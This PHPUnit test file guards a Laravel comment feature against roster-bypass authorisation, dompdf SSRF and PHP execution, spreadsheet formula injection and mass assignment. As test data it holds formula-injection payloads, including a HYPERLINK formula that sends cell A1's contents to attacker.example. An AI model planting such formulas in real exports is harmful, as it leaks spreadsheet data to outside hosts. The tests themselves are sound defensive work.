<?php

namespace Tests\Unit;

use App\Http\Controllers\Admin\UserController;
use App\Models\OtParticipantComment;
use Illuminate\Support\Facades\Route;
use ReflectionClass;
use ReflectionMethod;
use Tests\TestCase;

/**
 * Guards the OT comment / feedback feature's authorisation and export safety.
 *
 * The rules locked down here were all absent when the feature was first written:
 *
 *  - the OT / Participants list is scoped to the viewer's own roster, but the three
 *    endpoints behind it accepted ANY participant — and the store endpoint takes a
 *    plain integer student pk and pushes the comment text to that participant as a
 *    notification, so any faculty user could write attributed feedback about anyone
 *    in the institute;
 *  - both new PDF exports ran dompdf with isPhpEnabled / isRemoteEnabled on, making
 *    the renderer a PHP execution context and an SSRF client;
 *  - the spreadsheet exports wrote the commenter's free text unsanitised, so a
 *    message starting "=" opened in Excel as a live formula;
 *  - the model had $guarded = [], leaving the attribution columns mass-assignable.
 *
 * Structural rather than request-level: this application's tables are legacy with no
 * factories and the suite runs against whatever database .env points at, so a test
 * that signs in a coordinator and posts a comment cannot execute here — see
 * CourseRepositoryDocumentAccessTest and the note in phpunit.xml. The roster rule
 * itself IS executed (canActOnOtParticipant with an injected roster); the rest is
 * asserted against the compiled method bodies, which is enough to stop each defect
 * being reintroduced.
 *
 * Run with:  php vendor/bin/phpunit --filter=OtParticipantCommentAuthorisation
 */
class OtParticipantCommentAuthorisationTest extends TestCase
{
    /** The three endpoints that read or write one named participant's feedback. */
    private const PARTICIPANT_SCOPED_METHODS = [
        'otParticipantCommentStore',
        'otParticipantComments',
        'otParticipantCommentsExport',
    ];

    /** The two PDF exports this feature added. */
    private const NEW_PDF_EXPORTS = [
        'otParticipantCommentsExport',
        'otParticipantsExport',
    ];

    // ---------------------------------------------------------------- roster rule

    public function test_a_participant_outside_the_viewers_roster_is_refused(): void
    {
        $controller = $this->controllerWithRoster([11 => true, 12 => true]);

        $this->assertTrue($this->mayActOn($controller, 11), 'Own participant must be allowed.');
        $this->assertTrue($this->mayActOn($controller, 12), 'Own participant must be allowed.');
        $this->assertFalse(
            $this->mayActOn($controller, 99),
            'A participant on nobody else\'s roster must be refused — this is the gap that let '
            . 'any faculty user comment on, and notify, any OT in the institute.'
        );
    }

    /** Super Admin / Training authority: null roster means "every course". */
    public function test_a_viewer_who_oversees_every_course_is_not_narrowed(): void
    {
        $controller = $this->controllerWithRoster(null);

        $this->assertTrue($this->mayActOn($controller, 99));
    }

    /** A portal user with no faculty record owns no roster, so owns no participant. */
    public function test_a_viewer_with_an_empty_roster_is_refused_every_participant(): void
    {
        $controller = $this->controllerWithRoster([]);

        $this->assertFalse($this->mayActOn($controller, 11));
    }

    public function test_all_three_participant_endpoints_consult_the_roster_gate(): void
    {
        foreach (self::PARTICIPANT_SCOPED_METHODS as $method) {
            $this->assertStringContainsString(
                'canActOnOtParticipant',
                $this->bodyOf($method),
                "{$method}() acts on one named participant but does not assert roster "
                . 'membership — canUseOtParticipants() is a blanket capability and says '
                . 'nothing about WHICH participant.'
            );
        }
    }

    // ------------------------------------------------------------------ renderer

    public function test_the_new_pdf_exports_do_not_enable_php_or_remote_fetching(): void
    {
        foreach (self::NEW_PDF_EXPORTS as $method) {
            $body = $this->bodyOf($method);

            $this->assertStringNotContainsString(
                "'isPhpEnabled' => true",
                $body,
                "{$method}() enables PHP execution in dompdf: any raw block reaching the "
                . 'template becomes server-side code. The shared export views need none.'
            );
            $this->assertStringNotContainsString(
                "'isRemoteEnabled' => true",
                $body,
                "{$method}() lets the PDF document fetch arbitrary URLs from the server (SSRF)."
            );
        }
    }

    // -------------------------------------------------------------------- exports

    public function test_the_spreadsheet_exports_sanitise_every_cell(): void
    {
        foreach (self::NEW_PDF_EXPORTS as $method) {
            $this->assertStringContainsString(
                'sanitizeExportRows',
                $this->bodyOf($method),
                "{$method}() writes rows to a workbook without sanitize_export_cell(): a cell "
                . 'beginning = + - @ is evaluated as a formula by Excel (CWE-1236).'
            );
        }
    }

    /** The guard must neutralise exactly the characters spreadsheets evaluate. */
    public function test_the_export_guard_neutralises_formula_prefixes(): void
    {
        foreach (['=HYPERLINK("http://x","go")', '+1+1', '-1+1', '@SUM(A1)', "\tx"] as $payload) {
            $this->assertStringStartsWith(
                "'",
                sanitize_export_cell($payload),
                'A formula-prefixed cell must be forced to text.'
            );
        }

        $this->assertSame('Good progress this week.', sanitize_export_cell('Good progress this week.'));
    }

    /**
     * Exercised end to end: the row guard the exports actually call, including the
     * placeholder rows it must leave alone.
     */
    public function test_the_row_guard_neutralises_formulas_and_leaves_placeholders_alone(): void
    {
        $method = new ReflectionMethod(UserController::class, 'sanitizeExportRows');
        $method->setAccessible(true);

        $out = $method->invoke(new UserController(), [
            [1, 'Dr A Sharma', '=HYPERLINK("https://attacker.example/?x="&A1,"Open report")', 'Yes', '-'],
            [2, 'N/A', 'Good progress this week.', 'No', '01 Sep 2026'],
        ]);

        $this->assertStringStartsWith(
            "'=",
            $out[0][2],
            'A comment beginning "=" must not reach the workbook as a live formula.'
        );
        $this->assertSame('-', $out[0][4], 'The "none" placeholder must not gain an apostrophe.');
        $this->assertSame('Good progress this week.', $out[1][2], 'Ordinary feedback must pass through unchanged.');
        $this->assertSame('01 Sep 2026', $out[1][4]);
    }

    // ------------------------------------------------------------ mass assignment

    public function test_attribution_columns_are_not_mass_assignable(): void
    {
        $comment = new OtParticipantComment();

        $this->assertNotEmpty(
            $comment->getFillable(),
            'An empty $fillable with no $guarded would make every column mass-assignable.'
        );

        foreach (['comment_by_user_id', 'comment_by_name', 'created_by', 'active_inactive', 'pk'] as $column) {
            $this->assertFalse(
                $comment->isFillable($column),
                "{$column} decides who a comment is attributed to, or whether it is visible at "
                . 'all, and must be assigned by the controller rather than accepted from request input.'
            );
        }

        foreach (['student_master_pk', 'message', 'notify_ot'] as $column) {
            $this->assertTrue($comment->isFillable($column), "{$column} is submitted by the modal.");
        }
    }

    // ------------------------------------------------------------- notify_ot = No

    public function test_the_participant_is_only_notified_when_notify_ot_is_yes(): void
    {
        $body = $this->bodyOf('otParticipantCommentStore');

        $branch = strpos($body, "if ((int) \$data['notify_ot'] === 1) {");
        $this->assertNotFalse($branch, 'The notify_ot = Yes branch has been renamed or removed.');

        $notify = strpos($body, 'NotificationService');
        $this->assertNotFalse($notify, 'The notification call has moved out of this method.');
        $this->assertGreaterThan(
            $branch,
            $notify,
            'The notification must be sent only inside the notify_ot = 1 branch — an OT who '
            . 'answered "No" must not be messaged.'
        );
        $this->assertSame(
            1,
            substr_count($body, 'NotificationService::class)'),
            'There is more than one notification call site; only the guarded one may exist.'
        );
    }

    // ---------------------------------------------------------------------- routes

    public function test_every_comment_route_is_registered_behind_auth(): void
    {
        $routes = [
            'admin.dashboard.ot-participants.comment.store',
            'admin.dashboard.ot-participants.comments',
            'admin.dashboard.ot-participants.comments.export',
            'admin.dashboard.ot-participants.export',
        ];

        foreach ($routes as $name) {
            $route = Route::getRoutes()->getByName($name);
            $this->assertNotNull($route, "Route {$name} is not registered.");
            $this->assertContains('auth', $route->gatherMiddleware(), "Route {$name} is not behind auth.");
        }
    }

    /** The write endpoint stays rate-limited: it also sends a notification. */
    public function test_the_comment_store_route_is_throttled(): void
    {
        $route = Route::getRoutes()->getByName('admin.dashboard.ot-participants.comment.store');
        $this->assertNotNull($route);

        $this->assertNotEmpty(
            array_filter(
                $route->gatherMiddleware(),
                fn ($m) => is_string($m) && str_starts_with($m, 'throttle:')
            ),
            'The comment store endpoint writes a row and pushes a notification, so it must stay throttled.'
        );
    }

    // ---------------------------------------------------------------- test helpers

    /** @param  array<int, true>|null  $roster */
    private function controllerWithRoster(?array $roster): UserController
    {
        $controller = new UserController();
        $reflection = new ReflectionClass($controller);

        // Short-circuits otParticipantRosterPks(), which would otherwise query the
        // coordinator and group-mapping tables.
        $resolved = $reflection->getProperty('otParticipantRosterResolved');
        $resolved->setAccessible(true);
        $resolved->setValue($controller, true);

        $cache = $reflection->getProperty('otParticipantRoster');
        $cache->setAccessible(true);
        $cache->setValue($controller, $roster);

        return $controller;
    }

    private function mayActOn(UserController $controller, int $studentPk): bool
    {
        $method = new ReflectionMethod($controller, 'canActOnOtParticipant');
        $method->setAccessible(true);

        return (bool) $method->invoke($controller, $studentPk);
    }

    /** One controller method's source, located by reflection rather than by grep. */
    private function bodyOf(string $method): string
    {
        $reflection = new ReflectionMethod(UserController::class, $method);
        $lines = file($reflection->getFileName());

        return implode('', array_slice(
            $lines,
            $reflection->getStartLine() - 1,
            $reflection->getEndLine() - $reflection->getStartLine() + 1
        ));
    }
}
